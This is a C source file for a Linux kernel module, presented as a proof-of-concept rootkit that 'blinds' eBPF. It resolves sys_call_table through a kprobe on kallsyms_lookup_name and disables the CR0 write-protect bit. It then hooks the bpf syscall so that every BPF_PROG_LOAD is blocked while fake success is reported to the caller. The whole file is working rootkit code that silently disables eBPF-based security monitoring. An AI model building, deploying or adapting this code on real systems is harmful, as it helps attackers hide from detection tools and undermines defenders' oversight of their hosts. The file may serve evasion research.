#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/bpf.h>
#include <linux/kprobes.h>
#include <asm/paravirt.h>
#include <linux/version.h>

// Module Information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yotam Dvir");
MODULE_DESCRIPTION("PoC: Blinding eBPF via Syscall Table Hooking (CR0 + PT_REGS)");

// ---------------------------------------------------------------------------
// Global Variables & Helpers
// ---------------------------------------------------------------------------

unsigned long *sys_call_table = NULL;

// Helper to find kallsyms_lookup_name dynamically if not exported
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int resolve_kallsyms_symbol(void) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)
    // On some older 5.4 kernels, this might still work directly, but we use kprobes to be safe
    // If your kernel exports it, you could technically set kallsyms_lookup_name_ptr = kallsyms_lookup_name;
#endif
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) return ret;
    kallsyms_lookup_name_ptr = (void *)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

// ---------------------------------------------------------------------------
// Part 1: The New Function Signature (CRITICAL FIX)
// ---------------------------------------------------------------------------

// Since Kernel 4.17 on x86_64, syscalls take a single 'pt_regs' argument.
// We must match this signature, otherwise 'cmd' will be garbage.
typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *regs);
static sys_call_ptr_t original_sys_bpf;

asmlinkage long hook_sys_bpf(const struct pt_regs *regs)
{
    // Extract the actual arguments from the registers
    // On x86_64: DI=arg1 (cmd), SI=arg2 (uattr), DX=arg3 (size)
    int cmd = (int)regs->di;

    // Check: Is the command loading a program (BPF_PROG_LOAD)?
    if (cmd == BPF_PROG_LOAD) {
        printk(KERN_ALERT "[Rootkit] CR0 Hook: Intercepted BPF_PROG_LOAD! Blocking.\n");
        return 4; // Fake Success
    }

    // Call original function with the registers
    return original_sys_bpf(regs);
}

// ---------------------------------------------------------------------------
// Part 2: CR0 Manipulation (Write Protection Disable)
// ---------------------------------------------------------------------------

static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : : "r" (val), "m" (__force_order));
}

static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0); // Disable WP (Write Protect) bit
    write_cr0_forced(cr0);
}

static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0); // Enable WP bit
    write_cr0_forced(cr0);
}

// ---------------------------------------------------------------------------
// Part 3: Init & Exit
// ---------------------------------------------------------------------------

static int __init my_rootkit_init(void)
{
    printk(KERN_INFO "[Rootkit] Loading CR0 module...\n");

    // 1. Resolve kallsyms helper
    if (resolve_kallsyms_symbol() < 0) {
        printk(KERN_ERR "[Rootkit] Failed to resolve kallsyms_lookup_name.\n");
        return -EFAULT;
    }

    // 2. Find sys_call_table
    sys_call_table = (unsigned long *)kallsyms_lookup_name_ptr("sys_call_table");
    if (!sys_call_table) {
        printk(KERN_ERR "[Rootkit] Failed to find sys_call_table.\n");
        return -EFAULT;
    }

    // 3. Save original pointer
    // Note: We cast to sys_call_ptr_t to match the pt_regs signature
    original_sys_bpf = (sys_call_ptr_t)sys_call_table[__NR_bpf];

    // 4. Perform the Swap (CRITICAL SECTION)
    // We disable interrupts to prevent race conditions while CR0 is modified
    unsigned long flags;
    local_irq_save(flags); 
    
    disable_write_protection();
    sys_call_table[__NR_bpf] = (unsigned long)hook_sys_bpf;
    enable_write_protection();
    
    local_irq_restore(flags);

    printk(KERN_INFO "[Rootkit] Hook installed via CR0 manipulation.\n");
    return 0;
}

static void __exit my_rootkit_exit(void)
{
    if (sys_call_table && original_sys_bpf) {
        unsigned long flags;
        local_irq_save(flags);
        
        disable_write_protection();
        sys_call_table[__NR_bpf] = (unsigned long)original_sys_bpf;
        enable_write_protection();
        
        local_irq_restore(flags);
        
        printk(KERN_INFO "[Rootkit] Hook removed.\n");
    }
}

module_init(my_rootkit_init);
module_exit(my_rootkit_exit);